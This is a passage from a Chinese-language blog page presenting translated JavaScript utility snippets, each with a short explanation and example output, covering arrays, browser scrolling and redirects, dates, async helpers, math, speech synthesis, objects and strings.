[2,3]</span></span><br><span class="line"><span class="comment">// tail([1]) -&gt; [1]</span></span><br></pre></td></tr></table></figure><h3 id="Take-抽取"><a href="#Take-抽取" class="headerlink" title="Take (抽取)"></a>Take (抽取)</h3><p>使用 Array.slice() 从头开始创建 n 个元素的数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> take = <span class="function">(<span class="params">arr, n = <span class="number">1</span></span>) =&gt;</span> arr.slice(<span class="number">0</span>, n);</span><br><span class="line"><span class="comment">// take([1, 2, 3], 5) -&gt; [1, 2, 3]</span></span><br><span class="line"><span class="comment">// take([1, 2, 3], 0) -&gt; []</span></span><br></pre></td></tr></table></figure><h3 id="Unique-values-of-array-数组去重"><a href="#Unique-values-of-array-数组去重" class="headerlink" title="Unique values of array (数组去重)"></a>Unique values of array (数组去重)</h3><p>使用ES6 Set 和 …rest 运算符去除所有重复的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unique = <span class="function"><span class="params">arr</span> =&gt;</span> [...new <span class="built_in">Set</span>(arr)];</span><br><span class="line"><span class="comment">// unique([1,2,2,3,4,4,5]) -&gt; [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h3 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h3><p>Bottom visible (底部可见即滚动至底部)<br>使用 scrollY，scrollHeight 和 clientHeight 来确定页面的底部是否可见。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bottomVisible = <span class="function"><span class="params">_</span> =&gt;</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.clientHeight + <span class="built_in">window</span>.scrollY &gt;= (<span class="built_in">document</span>.documentElement.scrollHeight || <span class="built_in">document</span>.documentElement.clientHeight);</span><br><span class="line"><span class="comment">// bottomVisible() -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Current-URL-当前链接地址"><a href="#Current-URL-当前链接地址" class="headerlink" title="Current URL (当前链接地址)"></a>Current URL (当前链接地址)</h3><p>使用 window.location.href 来获取当前链接地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> currentUrl = <span class="function"><span class="params">_</span> =&gt;</span> <span class="built_in">window</span>.location.href;</span><br><span class="line"><span class="comment">// currentUrl() -&gt; &#x27;https://google.com&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Element-is-visible-in-viewport-元素在视窗中可见"><a href="#Element-is-visible-in-viewport-元素在视窗中可见" class="headerlink" title="Element is visible in viewport (元素在视窗中可见)"></a>Element is visible in viewport (元素在视窗中可见)</h3><p>使用 Element.getBoundingClientRect() 和 window.inner(Width|Height) 值来确定给定的元素在视口中是否可见。<br>第二个参数用来指定元素是否要求完全可见，指定 true 即部分可见，默认为全部可见。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> elementIsVisibleInViewport = <span class="function">(<span class="params">el, partiallyVisible = <span class="literal">false</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; top, left, bottom, right &#125; = el.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">return</span> partiallyVisible</span><br><span class="line">    ? ((top &gt; <span class="number">0</span> &amp;&amp; top &lt; innerHeight) || (bottom &gt; <span class="number">0</span> &amp;&amp; bottom &lt; innerHeight)) &amp;&amp;</span><br><span class="line">      ((left &gt; <span class="number">0</span> &amp;&amp; left &lt; innerWidth) || (right &gt; <span class="number">0</span> &amp;&amp; right &lt; innerWidth))</span><br><span class="line">    : top &gt;= <span class="number">0</span> &amp;&amp; left &gt;= <span class="number">0</span> &amp;&amp; bottom &lt;= innerHeight &amp;&amp; right &lt;= innerWidth;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// e.g. 100x100 viewport and a 10x10px element at position &#123;top: -1, left: 0, bottom: 9, right: 10&#125;</span></span><br><span class="line"><span class="comment">// elementIsVisibleInViewport(el) -&gt; false (not fully visible)</span></span><br><span class="line"><span class="comment">// elementIsVisibleInViewport(el, true) -&gt; true (partially visible)</span></span><br></pre></td></tr></table></figure><h3 id="Get-scroll-position-获取滚动位置"><a href="#Get-scroll-position-获取滚动位置" class="headerlink" title="Get scroll position (获取滚动位置)"></a>Get scroll position (获取滚动位置)</h3><p>如果存在，使用 pageXOffset 和 pageYOffset，否则使用 scrollLeft 和 scrollTop。<br>你可以省略 el，默认使用 window。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getScrollPos = <span class="function">(<span class="params">el = <span class="built_in">window</span></span>) =&gt;</span></span><br><span class="line">  (&#123;<span class="attr">x</span>: (el.pageXOffset !== <span class="literal">undefined</span>) ? el.pageXOffset : el.scrollLeft,</span><br><span class="line">    y: (el.pageYOffset !== <span class="literal">undefined</span>) ? el.pageYOffset : el.scrollTop&#125;);</span><br><span class="line"><span class="comment">// getScrollPos() -&gt; &#123;x: 0, y: 200&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Redirect-to-URL-URL-重定向"><a href="#Redirect-to-URL-URL-重定向" class="headerlink" title="Redirect to URL (URL 重定向)"></a>Redirect to URL (URL 重定向)</h3><p>使用 window.location.href 或者 window.location.replace() 去重定向到 url。<br>第二个参数用来控制模拟链接点击（true - 默认）还是 HTTP 重定向（false）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> redirect = <span class="function">(<span class="params">url, asLink = <span class="literal">true</span></span>) =&gt;</span></span><br><span class="line">  asLink ? <span class="built_in">window</span>.location.href = url : <span class="built_in">window</span>.location.replace(url);</span><br><span class="line"><span class="comment">// redirect(&#x27;https://google.com&#x27;)</span></span><br></pre></td></tr></table></figure><h3 id="Scroll-to-top-滚动至顶部"><a href="#Scroll-to-top-滚动至顶部" class="headerlink" title="Scroll to top (滚动至顶部)"></a>Scroll to top (滚动至顶部)</h3><p>使用 document.documentElement.scrollTop 或 document.body.scrollTop 获取到顶端的距离。<br>从顶部滚动一小部分距离。 使用 window.requestAnimationFrame（） 实现滚动动画。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> scrollToTop = <span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> c = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</span><br><span class="line">  <span class="keyword">if</span> (c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame(scrollToTop);</span><br><span class="line">    <span class="built_in">window</span>.scrollTo(<span class="number">0</span>, c - c / <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// scrollToTop()</span></span><br></pre></td></tr></table></figure><h3 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h3><p>Get days difference between dates (获取两个日期间的差距)<br>计算两个 Date 对象之间的差距（以天为单位）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getDaysDiffBetweenDates = <span class="function">(<span class="params">dateInitial, dateFinal</span>) =&gt;</span> (dateFinal - dateInitial) / (<span class="number">1000</span> * <span class="number">3600</span> * <span class="number">24</span>);</span><br><span class="line"><span class="comment">// getDaysDiffBetweenDates(new Date(&quot;2017-12-13&quot;), new Date(&quot;2017-12-22&quot;)) -&gt; 9</span></span><br></pre></td></tr></table></figure><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><p>Chain asynchronous functions (链式异步函数)<br>循环遍历包含异步事件的函数数组，当每个异步事件完成时调用 next。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chainAsync = <span class="function"><span class="params">fns</span> =&gt;</span> &#123; <span class="keyword">let</span> curr = <span class="number">0</span>; <span class="keyword">const</span> next = <span class="function">() =&gt;</span> fns[curr++](next); next(); &#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">chainAsync([</span></span><br><span class="line"><span class="comment">next =&gt; &#123; console.log(&#x27;0 seconds&#x27;); setTimeout(next, 1000); &#125;,</span></span><br><span class="line"><span class="comment">next =&gt; &#123; console.log(&#x27;1 second&#x27;);  setTimeout(next, 1000); &#125;,</span></span><br><span class="line"><span class="comment">next =&gt; &#123; console.log(&#x27;2 seconds&#x27;); &#125;</span></span><br><span class="line"><span class="comment">])</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="Curry-函数柯里化"><a href="#Curry-函数柯里化" class="headerlink" title="Curry (函数柯里化)"></a>Curry (函数柯里化)</h3><p>使用递归。<br>如果提供的参数（args）的数量足够，则调用传递的函数 fn，否则返回一个柯里化函数 fn，等待传入剩下的参数。<br>如果你想要一个接受参数数量可变的函数（一个可变参数函数，例如Math.min()），你可以选择将参数个数传递给第二个参数 arity。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> curry = <span class="function">(<span class="params">fn, arity = fn.length, ...args</span>) =&gt;</span></span><br><span class="line">arity &lt;= args.length</span><br><span class="line">    ? fn(...args)</span><br><span class="line">    : curry.bind(<span class="literal">null</span>, fn, arity, ...args);</span><br><span class="line"><span class="comment">// curry(Math.pow)(2)(10) -&gt; 1024</span></span><br><span class="line"><span class="comment">// curry(Math.min, 3)(10)(50)(2) -&gt; 2</span></span><br></pre></td></tr></table></figure><h3 id="Pipe-管道"><a href="#Pipe-管道" class="headerlink" title="Pipe (管道)"></a>Pipe (管道)</h3><p>使用 Array.reduce() 让值在函数间流通。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pipe = <span class="function">(<span class="params">...funcs</span>) =&gt;</span> <span class="function"><span class="params">arg</span> =&gt;</span> funcs.reduce(<span class="function">(<span class="params">acc, func</span>) =&gt;</span> func(acc), arg);</span><br><span class="line"><span class="comment">// pipe(btoa, x =&gt; x.toUpperCase())(&quot;Test&quot;) -&gt; &quot;VGVZDA==&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Promisify-promise转化"><a href="#Promisify-promise转化" class="headerlink" title="Promisify (promise转化)"></a>Promisify (promise转化)</h3><p>使用 currying 返回一个函数，返回一个调用原始函数的 Promise。<br>使用 …rest 运算符传入所有参数。</p><p>In Node 8+, you can use util.promisify</p><p>Node 8 版本以上，你可以使用 util.promisify</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promisify = <span class="function"><span class="params">func</span> =&gt;</span></span><br><span class="line">(...args) =&gt;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span></span><br><span class="line">    func(...args, <span class="function">(<span class="params">err, result</span>) =&gt;</span></span><br><span class="line">        err ? reject(err) : resolve(result))</span><br><span class="line">    );</span><br><span class="line"><span class="comment">// const delay = promisify((d, cb) =&gt; setTimeout(cb, d))</span></span><br><span class="line"><span class="comment">// delay(2000).then(() =&gt; console.log(&#x27;Hi!&#x27;)) -&gt; Promise resolves after 2s</span></span><br></pre></td></tr></table></figure><h3 id="Run-promises-in-series-队列运行promise"><a href="#Run-promises-in-series-队列运行promise" class="headerlink" title="Run promises in series (队列运行promise)"></a>Run promises in series (队列运行promise)</h3><p>使用 Array.reduce() 通过创建一个 promise 链来运行一系列 promise，每个 promise 在解析时返回下一个 promise。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> series = <span class="function"><span class="params">ps</span> =&gt;</span> ps.reduce(<span class="function">(<span class="params">p, next</span>) =&gt;</span> p.then(next), <span class="built_in">Promise</span>.resolve());</span><br><span class="line"><span class="comment">// const delay = (d) =&gt; new Promise(r =&gt; setTimeout(r, d))</span></span><br><span class="line"><span class="comment">// series([() =&gt; delay(1000), () =&gt; delay(2000)]) -&gt; executes each promise sequentially, taking a total of 3 seconds to complete</span></span><br></pre></td></tr></table></figure><h3 id="Sleep-睡眠"><a href="#Sleep-睡眠" class="headerlink" title="Sleep (睡眠)"></a>Sleep (睡眠)</h3><p>通过返回一个 Promise 延迟执行 async 函数，把它放到睡眠状态。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sleep = <span class="function"><span class="params">ms</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">async function sleepyWork() &#123;</span></span><br><span class="line"><span class="comment">  console.log(&#x27;I\&#x27;m going to sleep for 1 second.&#x27;);</span></span><br><span class="line"><span class="comment">  await sleep(1000);</span></span><br><span class="line"><span class="comment">  console.log(&#x27;I woke up after 1 second.&#x27;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><p>Collatz algorithm (考拉兹算法)<br>如果 n 是偶数，返回 n/2，否则返回 3n+1。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> collatz = <span class="function"><span class="params">n</span> =&gt;</span> (n % <span class="number">2</span> == <span class="number">0</span>) ? (n / <span class="number">2</span>) : (<span class="number">3</span> * n + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// collatz(8) --&gt; 4</span></span><br><span class="line"><span class="comment">// collatz(5) --&gt; 16</span></span><br></pre></td></tr></table></figure><h3 id="Distance-between-two-points-两点间的距离"><a href="#Distance-between-two-points-两点间的距离" class="headerlink" title="Distance between two points (两点间的距离)"></a>Distance between two points (两点间的距离)</h3><p>使用 Matg.hypot() 来计算两点间的欧式距离。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> distance = <span class="function">(<span class="params">x0, y0, x1, y1</span>) =&gt;</span> <span class="built_in">Math</span>.hypot(x1 - x0, y1 - y0);</span><br><span class="line"><span class="comment">// distance(1,1, 2,3) -&gt; 2.23606797749979</span></span><br></pre></td></tr></table></figure><h3 id="Divisible-by-number-可否被整除"><a href="#Divisible-by-number-可否被整除" class="headerlink" title="Divisible by number (可否被整除)"></a>Divisible by number (可否被整除)</h3><p>使用模运算符（％）来检查余数是否等于 0。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isDivisible = <span class="function">(<span class="params">dividend, divisor</span>) =&gt;</span> dividend % divisor === <span class="number">0</span>;</span><br><span class="line"><span class="comment">// isDivisible(6,3) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Even-or-odd-number-偶数或奇数"><a href="#Even-or-odd-number-偶数或奇数" class="headerlink" title="Even or odd number (偶数或奇数)"></a>Even or odd number (偶数或奇数)</h3><p>使用模运算符（%）来计算一个数为偶数还是奇数。<br>返回 true 为偶数，返回 false 则为奇数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isEven = <span class="function"><span class="params">num</span> =&gt;</span> num % <span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line"><span class="comment">// isEven(3) -&gt; false</span></span><br></pre></td></tr></table></figure><h3 id="Factorial-阶乘"><a href="#Factorial-阶乘" class="headerlink" title="Factorial (阶乘)"></a>Factorial (阶乘)</h3><p>使用递归。<br>如果 n 小于或等于 1，返回 1。<br>其它情况，则返回 n 和 n-1 的阶乘的积。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> factorial = <span class="function"><span class="params">n</span> =&gt;</span> n &lt;= <span class="number">1</span> ? <span class="number">1</span> : n * factorial(n - <span class="number">1</span>);</span><br><span class="line"><span class="comment">// factorial(6) -&gt; 720</span></span><br></pre></td></tr></table></figure><h3 id="Fibonacci-array-generator-斐波纳契数组生成器"><a href="#Fibonacci-array-generator-斐波纳契数组生成器" class="headerlink" title="Fibonacci array generator (斐波纳契数组生成器)"></a>Fibonacci array generator (斐波纳契数组生成器)</h3><p>创建一个指定长度的空数组，初始化前两个值（0和1）。<br>使用 Array.reduce() 将最后两个值的总和添加到数组中（前两个除外）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fibonacci = <span class="function"><span class="params">n</span> =&gt;</span></span><br><span class="line">  <span class="built_in">Array</span>(n).fill(<span class="number">0</span>).reduce(<span class="function">(<span class="params">acc, val, i</span>) =&gt;</span> acc.concat(i &gt; <span class="number">1</span> ? acc[i - <span class="number">1</span>] + acc[i - <span class="number">2</span>] : i), []);</span><br><span class="line"><span class="comment">// fibonacci(5) -&gt; [0,1,1,2,3]</span></span><br></pre></td></tr></table></figure><h3 id="Greatest-common-divisor-GCD-最大公约数-译者注：使用辗转相乘法"><a href="#Greatest-common-divisor-GCD-最大公约数-译者注：使用辗转相乘法" class="headerlink" title="Greatest common divisor (GCD) (最大公约数)(译者注：使用辗转相乘法)"></a>Greatest common divisor (GCD) (最大公约数)(译者注：使用辗转相乘法)</h3><p>使用递归。<br>基本情况是如果 y 等于 0，则返回 x。<br>其它情况下，返回 y 与 x/y 的最大公约数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gcd = <span class="function">(<span class="params">x, y</span>) =&gt;</span> !y ? x : gcd(y, x % y);</span><br><span class="line"><span class="comment">// gcd (8, 36) -&gt; 4</span></span><br></pre></td></tr></table></figure><h3 id="Hamming-distance-汉明距离"><a href="#Hamming-distance-汉明距离" class="headerlink" title="Hamming distance (汉明距离)"></a>Hamming distance (汉明距离)</h3><p>使用 异或 运算符（^）去查找两个数值间的位差，使用 toString(2) 转换为二进制值，使用 match(/1/g) 计算并返回字符串中 1 的数量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hammingDistance = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span></span><br><span class="line">  ((num1 ^ num2).toString(<span class="number">2</span>).match(<span class="regexp">/1/g</span>) || <span class="string">&#x27;&#x27;</span>).length;</span><br><span class="line"><span class="comment">// hammingDistance(2,3) -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Percentile-百分位数"><a href="#Percentile-百分位数" class="headerlink" title="Percentile (百分位数)"></a>Percentile (百分位数)</h3><p>使用百分比公式计算给定数组中有多少个数小于或等于给定值。</p><p>使用Array.reduce()计算值的下面有多少个数是相同的值, 并应用百分比公式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> percentile = <span class="function">(<span class="params">arr, val</span>) =&gt;</span> </span><br><span class="line">  <span class="number">100</span> * arr.reduce(<span class="function">(<span class="params">acc,v</span>) =&gt;</span> acc + (v &lt; val ? <span class="number">1</span> : <span class="number">0</span>) + (v === val ? <span class="number">0.5</span> : <span class="number">0</span>), <span class="number">0</span>) / arr.length;</span><br><span class="line"><span class="comment">// percentile([1,2,3,4,5,6,7,8,9,10], 6) -&gt; 55</span></span><br></pre></td></tr></table></figure><h3 id="Powerset-幂集"><a href="#Powerset-幂集" class="headerlink" title="Powerset (幂集)"></a>Powerset (幂集)</h3><p>使用 Array.reduce() 与 Array.map() 结合来迭代元素并将其组合成一个包含所有组合的数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> powerset = <span class="function"><span class="params">arr</span> =&gt;</span></span><br><span class="line">  arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(a.map(<span class="function"><span class="params">r</span> =&gt;</span> [v].concat(r))), [[]]);</span><br><span class="line"><span class="comment">// powerset([1,2]) -&gt; [[], [1], [2], [2,1]]</span></span><br></pre></td></tr></table></figure><h3 id="Round-number-to-n-digits-取小数点后-n-位"><a href="#Round-number-to-n-digits-取小数点后-n-位" class="headerlink" title="Round number to n digits (取小数点后 n 位)"></a>Round number to n digits (取小数点后 n 位)</h3><p>使用 Math.round() 和字符串模板将数字四舍五入到指定的位数。<br>省略第二个参数，decimals 将四舍五入到一个整数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> round = <span class="function">(<span class="params">n, decimals=<span class="number">0</span></span>) =&gt;</span> <span class="built_in">Number</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.round(<span class="string">`<span class="subst">$&#123;n&#125;</span>e<span class="subst">$&#123;decimals&#125;</span>`</span>)&#125;</span>e-<span class="subst">$&#123;decimals&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// round(1.005, 2) -&gt; 1.01</span></span><br></pre></td></tr></table></figure><h3 id="Standard-deviation-标准差"><a href="#Standard-deviation-标准差" class="headerlink" title="Standard deviation (标准差)"></a>Standard deviation (标准差)</h3><p>Use Array.reduce() to calculate the mean, variance and the sum of the variance of the values, the variance of the values, then<br>determine the standard deviation.<br>You can omit the second argument to get the sample standard deviation or set it to true to get the population standard deviation.</p><p>使用 Array.reduce() 来计算平均值，方差以及方差之和，然后确定标准偏差。<br>您可以省略第二个参数来获取样本标准差或将其设置为 true 以获得总体标准差。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> standardDeviation = <span class="function">(<span class="params">arr, usePopulation = <span class="literal">false</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> mean = arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>) / arr.length;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.sqrt(</span><br><span class="line">    arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc.concat(<span class="built_in">Math</span>.pow(val - mean, <span class="number">2</span>)), [])</span><br><span class="line">       .reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>) / (arr.length - (usePopulation ? <span class="number">0</span> : <span class="number">1</span>))</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// standardDeviation([10,2,38,23,38,23,21]) -&gt; 13.284434142114991 (sample)</span></span><br><span class="line"><span class="comment">// standardDeviation([10,2,38,23,38,23,21], true) -&gt; 12.29899614287479 (population)</span></span><br></pre></td></tr></table></figure><h3 id="Media-媒体"><a href="#Media-媒体" class="headerlink" title="Media (媒体)"></a>Media (媒体)</h3><p>Speech synthesis (experimental) 语音合成(试验功能)<br>使用 SpeechSynthesisUtterance.voice 和 indow.speechSynthesis.getVoices() 将消息转换为语音。<br>使用 window.speechSynthesis.speak() 来播放消息。</p><p>了解更多关于 SpeechSynthesisUtterance interface of the Web Speech API.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> speak = <span class="function"><span class="params">message</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> msg = <span class="keyword">new</span> SpeechSynthesisUtterance(message);</span><br><span class="line">  msg.voice = <span class="built_in">window</span>.speechSynthesis.getVoices()[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">window</span>.speechSynthesis.speak(msg);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// speak(&#x27;Hello, World&#x27;) -&gt; plays the message</span></span><br></pre></td></tr></table></figure><h3 id="Object-对象"><a href="#Object-对象" class="headerlink" title="Object (对象)"></a>Object (对象)</h3><p>Object from key-value pairs (键值对创建对象)<br>使用 Array.reduce() 创建和组合键值对。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectFromPairs = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> (a[v[<span class="number">0</span>]] = v[<span class="number">1</span>], a), &#123;&#125;);</span><br><span class="line"><span class="comment">// objectFromPairs([[&#x27;a&#x27;,1],[&#x27;b&#x27;,2]]) -&gt; &#123;a: 1, b: 2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Object-to-key-value-pairs-对象生成键值对"><a href="#Object-to-key-value-pairs-对象生成键值对" class="headerlink" title="Object to key-value pairs (对象生成键值对)"></a>Object to key-value pairs (对象生成键值对)</h3><p>使用 Object.keys() 和 Array.map() 去遍历对象的键并生成一个包含键值对的数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectToPairs = <span class="function"><span class="params">obj</span> =&gt;</span> <span class="built_in">Object</span>.keys(obj).map(<span class="function"><span class="params">k</span> =&gt;</span> [k, obj[k]]);</span><br><span class="line"><span class="comment">// objectToPairs(&#123;a: 1, b: 2&#125;) -&gt; [[&#x27;a&#x27;,1],[&#x27;b&#x27;,2]])</span></span><br></pre></td></tr></table></figure><h3 id="Shallow-clone-object-浅拷贝对象"><a href="#Shallow-clone-object-浅拷贝对象" class="headerlink" title="Shallow clone object (浅拷贝对象)"></a>Shallow clone object (浅拷贝对象)</h3><p>使用 …spread 扩展运算符将目标对象的属性添加到拷贝对象中。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shallowClone = <span class="function"><span class="params">obj</span> =&gt;</span> (&#123; ...obj &#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">const a = &#123; x: true, y: 1 &#125;;</span></span><br><span class="line"><span class="comment">const b = shallowClone(a);</span></span><br><span class="line"><span class="comment">a === b -&gt; false</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String (字符串)"></a>String (字符串)</h3><p>Anagrams of string (with duplicates) (字符串异位(和重复))<br>使用递归。<br>遍历给定字符串中的每个字母，用其余字母创建所有部分字母。<br>使用 Array.map() 将字母与每个部分字母组合，然后使用 Array.reduce() 将所有字母组合到一个数组中。<br>当给定字符串数量等与 2 或 1 时做简单处理。＝</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 